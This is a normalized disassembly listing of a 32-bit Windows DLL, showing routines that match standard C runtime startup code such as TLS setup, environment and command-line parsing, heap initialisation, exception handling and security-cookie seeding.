je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10017d5c
push esi
call sub_10011c31
pop ecx
push edi
call sub_1001476b
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_10011c31
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_10014593
pop ecx
sub_10017d65
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call sub_100179d0
pop ecx
call eax
push [ ebp + 0x8 ]
call sub_10017c36
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_10017dd3
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_10013ab8
pop ecx
call sub_10017a7f
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_10017a42
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_10013d93
push [ rw-data ]
call sub_10017955
push [ rw-data ]
mov [ rw-data ] eax
call sub_10017955
push [ rw-data ]
mov [ rw-data ] eax
call sub_10017955
push [ rw-data ]
mov [ rw-data ] eax
call sub_10017955
add esp 0x10
mov [ rw-data ] eax
call sub_1001a30e
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_10017c36
push [ rw-data ]
call sub_100179d0
pop ecx
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_100166ee
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_100179d0
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_10017abc
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_10017f60
push 0xc
push r--data
call sub_10018984
push 0xe
call sub_1001a48a
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10017fc7
call sub_100189c9
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_10011c31
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_10011c31
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_10017fdf
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_100179d0
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_10018007
push 0x54
push r--data
call sub_10018984
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_100166ee
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_100166ee
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_100189c9
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_1001d612
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_1001d612
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_1001825b
mov edi edi
push esi
push edi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
lea eax [ edi + 0x800 ]
jmp r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
pop esi
retn
cmp edi eax
jb r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push [ esi ]
call sub_10011c31
and [ esi ] 0x0
pop ecx
mov eax [ esi ]
add edi 0x40
add eax 0x800
lea eax [ edi + 0xc ]
push eax
call [ DeleteCriticalSection@IAT ]
sub_100182a9
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_1001d0fb
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_100166ee
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_10010990
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_10010990
mov ebx eax
inc ebx
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_10011c31
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_100166ee
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_10011c31
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_100178e5
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebx
add edi 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10010a44
add esp 0x14
sub_10018387
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_1001f9a9
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_1001f9a9
pop ecx
test eax eax
je r-xdata
call sub_1001f9a9
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_10018521
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_1001d0fb
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_10018387
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_100166a9
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_10018387
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_100185dc
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
push ebx
push esi
mov esi [ GetEnvironmentStringsW@IAT ]
push edi
xor ebx ebx
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call esi
mov edi eax
cmp edi ebx
je r-xdata
cmp eax 0x2
je r-xdata
cmp edi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax edi
cmp [ edi ] bx
je r-xdata
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax edi
push ebx
sar eax 0x1
inc eax
push eax
push edi
push ebx
push ebx
mov [ ebp - 0xc ] eax
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax esi
inc eax
push eax
mov [ ebp - 0x8 ] eax
call sub_100166a9
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push eax
call sub_100166a9
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push [ ebp - 0x8 ]
push esi
push edi
call sub_10017080
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push edi
push ebx
push ebx
call esi
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_10011c31
pop ecx
mov [ ebp - 0x4 ] ebx
sub_10018713
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_10018739
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1001875f
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rw-data ] eax
pop ebp
retn
pop ebp
retn
sub_1001878f
cmp [ rw-data ] 0x3
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
retn
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push edi
mov edi [ HeapFree@IAT ]
jle r-xdata
push [ rw-data ]
push 0x0
push [ rw-data ]
call edi
pop edi
pop ebx
push esi
mov esi [ rw-data ]
add esi 0x10
push 0x8000
push 0x0
push [ esi - 0x4 ]
call [ VirtualFree@IAT ]
push [ esi ]
push 0x0
push [ rw-data ]
call edi
add esi 0x14
inc ebx
cmp ebx [ rw-data ]
jl r-xdata
pop esi
sub_10018803
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_10017ba3
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_10018963
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_10018803
pop ecx
pop ecx
pop ebp
retn
sub_10018984
push sub_100189e0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_100189e0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10010789
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10010789
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_1001c290
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_1001c246
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10010789
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10010789
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_1001c276
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_1001c290
mov eax [ ebp + 0xc ]
push r--data
call sub_1001d290
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10010789
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_1001c25d
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10010789
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_10018b6c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_10018c02
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_1001fb2a
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_1001fb2a
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_10010990
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rw-data
push edi
call sub_100178e5
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10010a44
add esp 0x14
push esi
call sub_10010990
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_100178e5
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_10010990
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_1001e36f
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10010a44
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rw-data ]
push ebx
push edi
call sub_1001e2fb
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10010a44
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_10010a44
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_1001f9c1
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10010a44
add esp 0x14
push r--data
push ebx
push edi
call sub_1001e2fb
add esp 0xc
test eax eax
je r-xdata
sub_10018dad
push 0x3
call sub_1001fb2a
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_10018c02
push 0xff
call sub_10018c02
pop ecx
pop ecx
push 0x3
call sub_1001fb2a
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_10018de6
mov edi edi
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x18 ]
xor ebx ebx
cmp [ ebp + 0xc ] 0x1
push edi
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x94 ] esi
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
push ebx
push 0x80
lea edi [ ebp - 0x84 ]
mov ecx edi
push ecx
push [ ebp + 0x14 ]
mov [ ebp - 0x88 ] ebx
push [ ebp + 0x10 ]
push eax
call sub_1001fce8
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
or eax 0xffffffff
push ebx
push 0x4
mov edi rw-data
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_1001fb75
add esp 0x18
test eax eax
je r-xdata
